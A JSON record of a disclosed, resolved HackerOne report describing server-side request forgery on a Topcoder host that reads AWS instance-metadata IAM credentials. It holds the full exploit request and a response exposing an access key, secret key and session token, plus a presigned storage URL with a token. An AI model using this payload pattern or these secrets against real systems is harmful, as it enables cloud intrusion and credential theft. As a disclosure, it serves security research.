@@ -1,0 +1,132 @@
+{
+  "id": 978823,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85Nzg4MjM=",
+  "url": "https://hackerone.com/reports/978823",
+  "title": "SSRF to AWS file read",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2020-09-11T01:32:47.567Z",
+  "submitted_at": "2020-09-11T01:32:47.653Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "zhh",
+    "url": "/zhh",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/93uojtfd40tux1u609v84terbo0s/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 43330,
+    "url": "https://hackerone.com/lab45",
+    "handle": "lab45",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/uss17aubpsiag1df5tlp5mriefid/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/uss17aubpsiag1df5tlp5mriefid/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Lab45",
+      "twitter_handle": "",
+      "website": "http://wipro.com/lab45",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2021-09-16T22:30:13.060Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-09-16T22:30:12.939Z",
+  "team_member_agreed_on_going_public_at": "2021-09-16T12:59:05.676Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nafter seeing the disclosure it looks like the bug was not fixed properly\n\n## Steps To Reproduce:\ncopy and paste the request below and paste it into Burpsuite repeater\n\n`GET /community-app-assets/api/proxy-post?url=http%3A%2F%2F169.254.169.254%2F/latest/meta-data/iam/security-credentials/ecsInstanceRole%3Fu%3D65bd5a1857b73643aad556093%26amp%3Bid%3D934e9ffdc5 HTTP/1.1\nHost: cognitive.topcoder.com\nContent-Length: 108\nAuthorization: ApiKey 130edef6-2289-4407-bfcf-3eedacebb860\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36\nContent-Type: application/x-www-form-urlencoded\nAccept: */*\nOrigin: http://cognitive.topcoder.com\nReferer: http://cognitive.topcoder.com/ibm-cloud\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9`\n\n`b_65bd5a1857b73643aad556093_934e9ffdc5=&EMAIL=eviltwin%404w15ul5vh79meeab3xqz2jk45vbpze.burpcollaborator.net`\n\n\n\n##Response\n`HTTP/1.1 200 OK\nDate: Fri, 11 Sep 2020 01:28:12 GMT\nContent-Type: text/html; charset=utf-8\nConnection: keep-alive\nSet-Cookie: AWSALB=aSpYpAdScSiCogY5VQi4XHhFWnu3JHIrxMXl5tMUe/tkJvgoS7oE/ss8jqxWakYo2YgARf7QZsQGKzAP40hOG0W3WA/IugU/FFGaQkZ2LXjrPk2hoP8fxJiVxycf; Expires=Fri, 18 Sep 2020 01:28:12 GMT; Path=/\nSet-Cookie: AWSALBCORS=aSpYpAdScSiCogY5VQi4XHhFWnu3JHIrxMXl5tMUe/tkJvgoS7oE/ss8jqxWakYo2YgARf7QZsQGKzAP40hOG0W3WA/IugU/FFGaQkZ2LXjrPk2hoP8fxJiVxycf; Expires=Fri, 18 Sep 2020 01:28:12 GMT; Path=/; SameSite=None\nX-DNS-Prefetch-Control: off\nX-Frame-Options: SAMEORIGIN\nStrict-Transport-Security: max-age=15552000; includeSubDomains\nX-Download-Options: noopen\nX-Content-Type-Options: nosniff\nX-XSS-Protection: 1; mode=block\nETag: W/\"512-LkSYc5PU5Y4xWGPxqoM8orPaKK0\"\nVary: Accept-Encoding\nContent-Length: 1298`\n\n`{\n  \"Code\" : \"Success\",\n  \"LastUpdated\" : \"2020-09-11T00:36:00Z\",\n  \"Type\" : \"AWS-HMAC\",\n  \"AccessKeyId\" : \"ASIAV6SVWBIPVJNDI4LO\",\n  \"SecretAccessKey\" : \"wAwYDQcsfEMUyku//RxXI/NjdAMUtRLj4cfSiEVQ\",\n  \"Token\" : \"IQoJb3JpZ2luX2VjEGEaCXVzLWVhc3QtMSJIMEYCIQD8srpZ/87c2HrLYddytORezee2NMx0/PWk4UH+2nahPgIhAOwlCmFgVAcdsUBpbDHI6McTLQcHlUnA/FAMOf5GoMWmKrQDCGoQABoMNDA5Mjc1MzM3MjQ3Igw+zvAcQIYJijsNTWsqkQMfVMu7kgOepBvF96NdZHk4KxICWOBDlrJN/MR9o3Hf6Ohst+4d/tbGeyCL7xClsepu+02nf/sX7Ggtx9ciqAg14OmsUWjzp4ZHntge0oi9AJpfyc76UVFNFdTwbo/hEEHKfjgC18lFW+E5DIP00Ifm7usFgLLABozP9Av/hJLwCWG7UHfnHicvc0eY9Tscc+RS4U0GWvUGGXji1vm/8ud5c7Ou6h2z2fo9fSODgq/c1sZReVtofuhSYOfpYtr4ByrHMVY78aR+VrF//6870MUJWNOI4EK3NFxtPH6HCJRmBwh3iVTqYI+vawove6BG3PmMkeyBZSqCqFCTuf+H/eEdw6orjNQ7BxurtB8ZaymaUABhNKfQTBeDBy8/G/wK75v7YZjPUmalMf89wGvshp5EHQVYySr3RGlS9Ti5FbIzR0Gl+5cLx/0AX6ce8L5UrXACpOLktOJe+l/W1KQchNOs9MEwSTYi+sa1qITd17XS9tp0BuRlZSX4MGQ0SJvDEmNvQq84avF4SLbqJLNZEVn0uDCkjev6BTrqAb5BqJ09VpgjlBloe0SAGp4uNlWheqWl+Vt3S+jcVRqf4LNAM3hbEvRB6pTt9itSE6l4y40QADcmMs0oWc6sm+oCG5enAkRxQBFYFDt+OvbxnSnQmaG3YDuRRJwpsaMA/V0TLqpQq5wvJMOssylXffenYIFpVIbZ5BQ5elDVqVpol/1fe+ej3slNvG6VqD3/OwLyNPjfAhdG3UmYzqyr3ym6uywn0KmLMY9esM7Mde5KA2LmgozCKpkV18u0LGCORGXGnllCWpuifVMYXoLQJgk8LCB5H6FbBbcqVvE5FGabClXZG3UIbhPsfg==\",\n  \"Expiration\" : \"2020-09-11T06:47:23Z\"\n}`\n\n\n## Supporting Material/References:\nvideo PoC: F983368\n\n## Impact\n\naws file read",
+  "weakness": {
+    "id": 68,
+    "name": "Server-Side Request Forgery (SSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 983368,
+      "file_name": "bandicam_2020-09-11_01-28-03-986.avi",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/L2DbuncyN3p1kKeiWEcnepsX?response-content-disposition=attachment%3B%20filename%3D%22bandicam_2020-09-11_01-28-03-986.avi%22%3B%20filename%2A%3DUTF-8%27%27bandicam_2020-09-11_01-28-03-986.avi&response-content-type=video%2Fx-msvideo&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRCTLAZYO%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151406Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJGMEQCICvDTKJUgIl%2Bq83LvpeoLVNAK%2Fknu%2B8YUfJlKUoo48BiAiAHUMZuidqQGWZFepCXdjX1mFlRVhT0VT7YgDhSZP92kSq6BQjo%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMNPL5bO5Z3alMXqRFKo4F4fBDy5oEITbcGbidgiv2X2t2a0NKYCb6ai4gPP77bYVo6i7gR7BG4vO9XJDbLMUklSyeDIhNl6NuuRjLl%2FJgd1VMJA1b53xukmdwXGb4rUbWiFoIExz0EWC%2BkT2XtAnB5mtw%2B%2BwqAMJjzITsjP%2BWWXD5i6dZHGW6mRNlZywimS79PZFEEj9gJvMkkHKpCYJu5UzhF3THASIExyqBbCsB401NNUR3QRxSwolUbKlu6BtZV3XRb27eXsFmzx7KPBm1xeSmIDgjKOmjHmFWkg%2BbaNG%2FfwsvWIeRFBoheEraVzCQfXweGJV2YdgNhKww9uRldIBilV962qk24%2BuNpmu3qsfr7fcef2P%2By1D%2B%2FytfZGRfZuiwBlmogRnG1LQvSDhEV1sV%2FrvmKi8ux7a%2BPLUFhWNkJB7%2F9ep8JPfmgTfy0hEbMSWIck5cNSt%2Fgko1ENIge83bR7nmp6%2BROFwrAwwd1lnGyZRY9OZEBnLRMQvoalcKydaa4wqSQDmH6GqoZZXm4WSJE3617MWydbKgk8W3ItafEuhIAHSofhuNdj6Ynl8mk6H8rgLzbOdbidcnnNOdcqipN5DED10whJlSnUwRsQBmSxN6p%2FmBApFCIkZQWtdYAZQDNltgGocyTSkXRe3HKn0hZGVUouuBIQvOtE5EMrscGNIFt3FATktVwSzZ%2FA6xkzaL9Qh6hu9XVmXCTdOuKSlaBHDiSfzYKJ1vTDqIBsSSU5nbYiSd9IAR8Yp3xyzGRfZxZQsvYTSxLAPELduG%2FV19MEEqUTy2gwKAnX4ZN0u5sG0Q%2BRfE1drrjnmU0tyUGOYAeLG5HqQQvfXGtmzgytHLuKTyI1tmN8lwj%2FsJW2FE7YvwVE4iiVZw3jsaMM6L%2Fc8GOrIBvO8cwwltCM4AdpQm9fgxmw5xylTv3zg9giXb3OYWLXKRgnJlEHrAmDmi6bvrYvpiQq2dmMClKLu7JhdGbhneuiiX6el3NvvQUzBssd2Fv3n1sfwbUtXe9%2BeDCMpN6l8qKlRTK27efoDAHuuBXAWX8nkjKDl7MjO%2BWDkCNHCGCyndZgpNGi1h6qtrSmHQTTOou5pX0%2BLnE%2Bb7rtMOkNB4k2pm81UBSOP7SpMpRgGnW%2FyM2g%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ac77ef5a656e132f52bc1210e3094aa5599a7de5ac89cde78d3745300909f681",
+      "file_size": 2348894,
+      "type": "video/x-msvideo",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 30,
+  "voters": [
+    "lubak",
+    "defenderwww",
+    "tolga",
+    "alp",
+    "shreyaschavhan",
+    "run_win",
+    "akashhamal0x01",
+    "c4l33ph4",
+    "0nlymohammed",
+    "0xwise",
+    "and 20 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 37523,
+    "asset_type": "URL",
+    "asset_identifier": "cognitive.topcoder.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
